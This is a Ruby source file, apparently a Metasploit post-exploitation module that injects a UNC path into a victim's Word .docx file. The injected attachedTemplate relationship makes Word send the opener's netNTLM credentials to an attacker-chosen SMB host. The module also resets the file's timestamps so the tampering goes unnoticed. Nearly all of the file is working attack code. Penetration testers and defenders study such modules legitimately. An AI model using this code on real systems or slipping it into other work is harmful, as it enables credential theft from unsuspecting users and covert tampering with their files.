##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://Metasploit.com/projects/Framework/
##

require 'msf/core'
require 'msf/core/post/file'
require 'zip/zip' #for extracting files
require 'rex/zip' #for creating files
require 'msf/core/post/windows/priv'

class Metasploit3 < Msf::Post

	include Msf::Post::File
	include Msf::Post::Windows::Priv

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Word UNC Path Injector',
			'Description'    => %q{
					This module modifies a remote .docx file that will, upon opening, submit
				stored netNTLM credentials to a remote host. Verified to work with Microsoft
				Word 2003, 2007 and 2010 as of January 2013. In order to get the hashes
				the auxiliary/server/capture/smb module can be used.
			},
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					[ 'URL', 'http://jedicorp.com/?p=534' ]
				],
			'Platform'	=> ['win'],
			'SessionTypes'	=> ['meterpreter'],
			'Author'        =>
				[
					'SphaZ <cyberphaz[at]gmail.com>'
				]
		))

		register_options(
			[
					OptAddress.new('SMBHOST',[true, 'Server IP or hostname that the .docx document points to']),
					OptString.new('FILE', [true, 'Remote file to inject UNC path into. ']),
					OptBool.new('BACKUP', [true, 'Make local backup of remote file.', true]),
			], self.class)
	end

	#Store MACE values so we can set them later again.
	def get_mace
		begin
			mace = session.priv.fs.get_file_mace(datastore['FILE'])
			vprint_status("Got file MACE attributes!")
		rescue
			print_error("Error getting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
		end
		return mace
	end

	#here we unzip into memory, inject our UNC path, store it in a temp file and
	#return the modified zipfile name for upload
	def manipulate_file(zipfile)
		ref = "<w:attachedTemplate r:id=\"rId1\"/>"

		rels_file_data = ""
		rels_file_data << "<?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"yes\"?>"
		rels_file_data << "<Relationships xmlns=\"http://schemas.openxmlformats.org/package/2006/relationships\">"
		rels_file_data << "<Relationship Id=\"rId1\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/"
		rels_file_data << "attachedTemplate\" Target=\"file://\\\\#{datastore['SMBHOST']}\\normal.dot\" TargetMode=\"External\"/></Relationships>"

		zip_data = unzip_docx(zipfile)
		if zip_data.nil?
			return nil
		end

		#file to check for reference file we need
		file_content = zip_data["word/settings.xml"]
		if file_content.nil?
			print_error("Bad \"word/settings.xml\" file, check if it is a valid .docx.")
			return nil
		end

		#if we can find the reference to our inject file, we don't need to add it and can just inject our unc path.
		if not file_content.index("w:attachedTemplate r:id=\"rId1\"").nil?
			vprint_status("Reference to rels file already exists in settings file, we dont need to add it :)")
			zip_data["word/_rels/settings.xml.rels"] = rels_file_data
			return zip_docx(zip_data)
		else
			#now insert the reference to the file that will enable our malicious entry
			insert_one = file_content.index("<w:defaultTabStop")

			if insert_one.nil?
				insert_two = file_content.index("<w:hyphenationZone") # 2nd choice
				if not insert_two.nil?
					vprint_status("HypenationZone found, we use this for insertion.")
					file_content.insert(insert_two, ref )
				end
			else
				vprint_status("DefaultTabStop found, we use this for insertion.")
				file_content.insert(insert_one, ref )
			end

			if insert_one.nil? && insert_two.nil?
				print_error("Cannot find insert point for reference into settings.xml")
				return nil
			end

			#update the files that contain the injection and reference
			zip_data["word/settings.xml"] = file_content
			zip_data["word/_rels/settings.xml.rels"] = rels_file_data
			return zip_docx(zip_data)
		end
	end

	#RubyZip sometimes corrupts the document when manipulating inside a
	#compressed document, so we extract it with Zip::ZipFile into memory
	def unzip_docx(zipfile)
		vprint_status("Extracting #{datastore['FILE']} into memory.")
		zip_data = Hash.new
		begin
			Zip::ZipFile.open(zipfile)  do |filezip|
				filezip.each do |entry|
					zip_data[entry.name] = filezip.read(entry)
				end
			end
		rescue Zip::ZipError => e
			print_error("Error extracting #{datastore['FILE']} please verify it is a valid .docx document.")
			return nil
		end
		return zip_data
	end

	#making the actual docx
	def zip_docx(zip_data)
		docx = Rex::Zip::Archive.new
		zip_data.each_pair do |k,v|
			docx.add_file(k,v)
		end
		return docx.pack
	end

	#We try put the mace values back to that of the original file
	def set_mace(mace)
		if not mace.nil?
			vprint_status("Setting MACE value of #{datastore['FILE']} set to that of the original file.")
			begin
				session.priv.fs.set_file_mace(datastore['FILE'], mace["Modified"], mace["Accessed"], mace["Created"], mace["Entry Modified"])
			rescue
				print_error("Error setting the original MACE values of #{datastore['FILE']}, not a fatal error but timestamps will be different!")
			end
		end
	end

	def rhost
		client.sock.peerhost
	end

	def run

		#sadly OptPath does not work, so we check manually if it exists
		if !file_exist?(datastore['FILE'])
			print_error("Remote file does not exist!")
			return
		end

		#get mace values so we can put them back after uploading. We do this first, so we have the original
		#accessed time too.
		file_mace = get_mace

		#download the remote file
		print_status("Downloading remote file #{datastore['FILE']}.")
		org_file_data = read_file(datastore['FILE'])

		#store the original file because we need to unzip from disk because there is no memory unzip
		if datastore['BACKUP']
			#logs_dir = ::File.join(Msf::Config.local_directory, 'unc_injector_backup')
			#FileUtils.mkdir_p(logs_dir)
			#@org_file =  logs_dir + File::Separator + datastore['FILE'].split('\\').last
			@org_file = store_loot(
				"host.word_unc_injector.changedfiles",
				"application/vnd.openxmlformats-officedocument.wordprocessingml.document",
				rhost,
				org_file_data,
				datastore['FILE']
			)
			print_status("Local backup kept at #{@org_file}")
			#Store information in note database so its obvious what we changed, were we stored the backup file..
			note_string ="Remote file #{datastore['FILE']} contains UNC path to #{datastore['SMBHOST']}. "
			note_string += " Local backup of file at #{@org_file}."
			report_note(
				:host => session.session_host,
				:type => "host.word_unc_injector.changedfiles",
				:data => {
					:session_num => session.sid,
					:stype => session.type,
					:desc => session.info,
					:platform => session.platform,
					:via_payload => session.via_payload,
					:via_exploit => session.via_exploit,
					:created_at => Time.now.utc,
					:files_changed => note_string
				}
			)
		else
			@org_file = Rex::Quickfile.new('msf_word_unc_injector')
		end

		vprint_status("Written remote file to #{@org_file}")
		File.open(@org_file, 'wb') { |f| f.write(org_file_data)}

		#Unzip, insert our UNC path, zip and return the data of the modified file for upload
		injected_file = manipulate_file(@org_file)
		if injected_file.nil?
			return
		end

		#upload the injected file
		write_file(datastore['FILE'], injected_file)
		print_status("Uploaded injected file.")

		#set mace values back to that of original
		set_mace(file_mace)

		#remove tmpfile if no backup is desired
		if not datastore['BACKUP']
			@org_file.close
			@org_file.unlink rescue nil # Windows often complains about unlinking tempfiles
		end

		print_good("Done! Remote file #{datastore['FILE']} succesfully injected to point to #{datastore['SMBHOST']}")
	end
end
